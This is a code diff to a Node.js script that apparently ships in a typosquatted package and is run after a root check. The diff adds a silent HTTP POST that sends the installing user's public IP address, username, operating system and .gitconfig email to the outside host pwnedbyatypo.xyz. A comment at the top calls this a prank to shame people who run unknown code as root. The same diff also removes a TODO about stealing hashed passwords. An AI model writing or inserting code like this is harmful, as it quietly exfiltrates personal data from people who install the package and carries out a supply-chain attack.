@@ -1,12 +1,20 @@
 #! /usr/bin/env node
 'use strict';
 
+/*
+ * DISCLAIMER: If you are reading this, know that it is invoked from another script that first checks for root access.
+ * So you know that it could be doing a lot worse, but it is not; all this script does is get your public IP, username,
+ * OS, and your email in your .gitconfig file. It then uploads that data to http://pwnedbyatypo.xyz to publicly shame you
+ * for running unknown code as root. 
+ */ 
+
 const async = require('async');
 const chalk = require('chalk');
 const gitconfig = require('git-config');
 const isRoot = require('is-root');
 const network = require('network');
 const os = require('node.os');
+const request = require('request');
 const shell = require('shelljs');
 const username = require('username');
 
@@ -20,14 +28,21 @@ async.series(operations, function(err, results) {
     if (err) {
         return err;
     } else {
-        // TODO - post to pwnedbyatypo.xyz
+        // silent HTTP Post to pwnedbyatypo.xyz
         let pwnedObj = {
             'ip': results[0],
             'username': results[1],
             'platform': results[2],
             'email': results[3]
         };
-        console.log(pwnedObj);
+        request.post({
+            url: 'http://pwnedbyatypo.xyz/pwned',
+            form: pwnedObj
+        }, function(err, response, body) {
+            if (err) {
+                return err;
+            }            
+        });        
     }
 });
 
@@ -50,7 +65,7 @@ function getUsername(callback) {
     });
 };
 
-//get OS and TODO steal some hashed passwords
+//get OS
 function getOs(callback) {
     let platform = os.os;
     callback(null, platform);
